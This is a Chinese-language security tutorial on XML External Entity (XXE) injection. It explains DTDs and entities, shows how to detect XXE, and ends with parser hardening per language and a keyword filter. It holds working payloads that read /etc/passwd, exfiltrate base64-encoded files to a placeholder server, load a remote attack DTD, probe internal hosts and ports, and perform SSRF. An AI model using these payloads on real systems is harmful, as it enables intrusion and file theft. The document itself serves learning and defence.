# XML External Entity Injection

## XML基础知识

XML包括三部分：XML声明、文档类型定义（DTD)（Optional）、文档元素。下面是一个格式的示范  

```xml
<!--这是注释-->
<!--XML声明-->
<?xml version="1.0"?>

<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

### XML-DTD简介

[DTD 教程 | 菜鸟教程](https://www.runoob.com/dtd/dtd-tutorial.html)

DTD定义了一系列的元素，这些元素可以用来定义文档的结构，也就是文档中可以出现的一些标签。DTD的一些关键字如下：  

+ DOCTYPE（DTD的声明）

+ ENTITY（实体的声明）

+ SYSTEM、PUBLIC（外部资源申请）

DTD可以被声明在XML文档，也可以作为外部引用。  

**内部声明**  

```xml
<!DOCTYPE 根元素 [元素声明]>
```

**外部引用**  

```xml
<!DOCTYPE 根元素 SYSTEM "文件名">
```

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<!--note.dtd为外部dtd文件-->
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

**为什么使用DTD？——标准问题**

+ 通过 DTD，每一个 XML 文件均可携带一个有关其自身格式的描述。  

+ 通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。  

+ 而应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。  

+ 还可以使用 DTD 来验证您自身的数据。  

### XML-构建模块

所有的 XML 文档（以及 HTML 文档）均由以下构建模块构成：  

- 元素
- 属性
- 实体
- PCDATA
- CDATA

#### 元素和属性

HTML 元素的例子是 "body" 和 "table"  

XML 元素的例子是 "note" 和 "message"   

元素可包含文本、其他元素或者是空的  

空的 HTML 元素的例子是 "hr"、"br" 以及 "img"  

```html
<body>some text</body>
<message>some text</message>
```

属性可以提供一些关于元素的额外信息，例如：  

```html
<img src="computer.gif" />
```

元素本身为空，所以html中用一个`/`关闭。

元素声明的方法有很多，下面粗略列出，格式为：模式||示例||注释

#### PCDATA

PCDATA 的意思是被解析的字符数据（parsed character data），可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。

**PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。**

文本中的标签会被当作标记来处理，而实体会被展开。因此被解析的字符数据不应当包含任何 &、< 或者 > 字符；需要使用 &、< 以及 > 实体来分别替换它们

#### CDATA

CDATA 的意思是字符数据（character data）。

**CDATA 是不会被解析器解析的文本。**

在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。

#### 实体

实体就是用来定义【普通文本】的变量，目的是防止注入的发生。  

实体引用则是一个符号，引用了该实体定义了的普通文本。当实体被XML解析器解析时，实体就会展开。  

例如：  

+ `&lt;` -> `<`

+ `&gt;` -> `>`

+ `&amp;` -> `&`

+ `&quot;` -> `"`

+ `&apos;` -> `'`

[HTML实体 ISO-8859-1 参考手册](https://www.w3school.com.cn/tags/html_ref_entities.html)  

实体分为内部实体、字符实体、通用实体、参数实体。  

重点介绍**外部实体**和**参数实体**（XXE主要利用了DTD引用外部实体导致的漏洞）  

**外部实体**  

```xml
<!ENTITY 实体名称 SYSTEM "URI">
```

外部实体可以有以下这些类型，不同语言的支持类型各异  

![](https://thief.one/upload_image/20170620/1.png)

php安装扩展还可以支持更多协议

![](https://security.tencent.com/uploadimg_dir/201409/fe9ccf2c88e0672ed79355f75c7c3d3b.png)

举例：  

```xml
<!DOCTYPE vuln[
    <!ENTITY content SYSTEM "file:///etc/passwd">]>
<foo>
    <value>&content</value>
</foo>
```

**参数实体**

参数实体在远程文件读取中，可以绕过文件内容复杂导致解析失败的限制

参数实体以%开头，使用参数实体只需要遵循两条原则：

1. 参数实体只能在DTD声明中 **调用**

2. 参数实体中不能再引用参数实体

```xml
<!DOCTYPE foo[
<!ENTITY % start "<![CDATA[">
<!ENTITY % goodies SYSTEM "file:///etc/fstab">
<!ENTITY % end "]]>">
<!ENTITY all "%start;%goodies;%end;">
]>

<foo>&all;</foo>
```

start，goodies和end是为了组成CDATA，避免被XML解析器解析。

```xml
<foo><! [CDATA["/etc/fstab文件的内容"]]></foo>
```

**PHP中，php的filter协议转换为base64也可以绕过xml的解析器。**

## XXE

### XXE的检测

**首先检测XML可否被成功解析**  

```xml
?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE ANY [  
<!ENTITY name "HELLO">]>    
<root>&name;</root>
```

如果输出了HELLO，则说明可以被解析

**然后检测是否支持DTD外部引用外部实体**  

```xml
<?xml version=”1.0” encoding=”UTF-8”?>  
<!DOCTYPE ANY [  
<!ENTITY % name SYSTEM "http://localhost/index.html">  
%name;  
]>
```

如果支持，很可能存在XXE漏洞。

### XXE的利用

本质上就是利用各种协议，基于服务器上Web应用程序的权限，进行各种大于客户权限的操作。  

#### **任意文件读取**

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### **不回显：发送至服务器**

```xml
<!DOCTYPE foo[
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % send SYSTEM 'http://yourServerIp/?%file'>
%file;
%send;
]>
```

#### **输入时关键字过滤：引用远程DTD**

比如过滤了file协议，那么可以在自己的服务器上建立一个DTD，再远程引用。

```xml
<!DOCTYPE a [
 <!ENTITY % dtd SYSTEM "http://www.hackersb.cn/attack.dtd"> 
%dtd; 
]>
```

其中，attack.dtd的内容为

```xml
<!ENTITY b SYSTEM "file:///etc/passwd">
```

注意：内层的实体如果是参数实体，其中的`%`必须进行URL字符实体的替换，即写成`&#x25;`

#### **内网探测**

NJUPT-CTF的一个例子  

```xml
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "http://192.168.1.8">
 ]>

<user><username>&xxe;</username><password>asd</password></user>
```

还可以探测端口，如果返回显示`Connection Refused`说明端口是关闭的，`Request Failed`等信息说明端口开启。

#### **SSRF**

可以以XXE主机为跳板，攻击内网的主机。就是在URL中加入payload

即使禁止了外部实体引用，SSRF也不会因此消失。可以使用DOCTYPE的方法：

```xml
<!DOCTYPE foo PUBLIC "-//VSR//PENTEST//EN" "http://internal/service?ssrf"
```

#### **某些JSON解析引发XXE**

有些服务器接收的请求格式为JSON。将JSON转换为XML，如果服务器仍然可以解析，则容易出现XXE漏洞。

首先JSON转换为XML，有一些自动转换工具：

```xml
Original JSON
{"search":"name","value":"netspitest"}

XML Conversion
<?xml version="1.0" encoding="UTF-8" ?>
<root>
<search>name</search>
<value>netspitest</value>
</root>
```

注意最后手动加上XML的root标签。

接下来更改Content-type

```http
HTTP Request:
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 112
```

进行XXE攻击

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>
```

不是所有JSON终端都会接收XML格式，改变Content-Type并没有太大用处，有可能你只会得到一个415的数据类型不支持错误。

#### **DOS**

递归地引用实体就会导致服务器资源被大量占用。

![](https://p3.ssl.qhimg.com/t010ad6f24eecda20af.png)

### XXE的修复

**各种语言的禁用外部实体方法**  

```php
//php
libxml_disable_entity_loader(true); 

//java
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

//python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

**过滤**  

过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC。  

## 参考文献

[未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)  

[XXE漏洞攻防之我见 - 安全客，安全资讯平台](https://www.anquanke.com/post/id/86075)  
